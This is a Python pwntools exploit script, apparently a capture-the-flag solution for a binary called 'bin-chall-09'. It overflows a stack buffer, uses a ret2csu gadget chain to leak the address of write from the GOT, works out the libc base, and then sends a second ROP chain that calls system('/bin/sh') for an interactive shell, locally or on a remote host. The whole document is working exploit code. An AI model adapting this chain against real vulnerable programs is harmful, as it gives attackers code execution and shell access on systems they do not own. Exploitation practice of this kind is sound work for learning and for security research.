#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-09")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

csu = "__libc_csu_init"
pop_gadgets = elf.symbols[csu] + 90
mov_gadgets = elf.symbols[csu] + 64

pad = 0x20 + 0x8
payload = b"A" * pad
payload += flat(pop_gadgets,
                0,  # rbx
                1,  # rbp -> to pass `rbp == (rbx+1)` check
                1,  # r12 -> mov edi, r12d
                elf.got["write"],  # r13 -> mov rsi, r13
                8,  # r14 -> mov rdx, r14
                elf.got["write"])  # r15 -> call QWORD PTR [r15+rbx*8]
payload += flat(mov_gadgets)
payload += flat(0,  # add rsp, 0x8
                0,  # rbx
                0,  # rbp
                0,  # r12
                0,  # r13
                0,  # r14
                0)  # r15
payload += flat(elf.symbols["main"])

io.sendafter(b"Input: ", payload)

leak_write = u64(io.recv(8))
log.info(f"{leak_write=:#x}")
libc.address = leak_write - libc.symbols["write"]
log.info(f"{libc.address=:#x}")

pop_rdi = 0x401293
ret = 0x40101a
payload = b"A" * pad
payload += flat(ret)
payload += flat(pop_rdi, next(libc.search(b"/bin/sh\x00")))
payload += flat(libc.symbols["system"])

io.sendafter(b"Input: ", payload)

io.interactive()
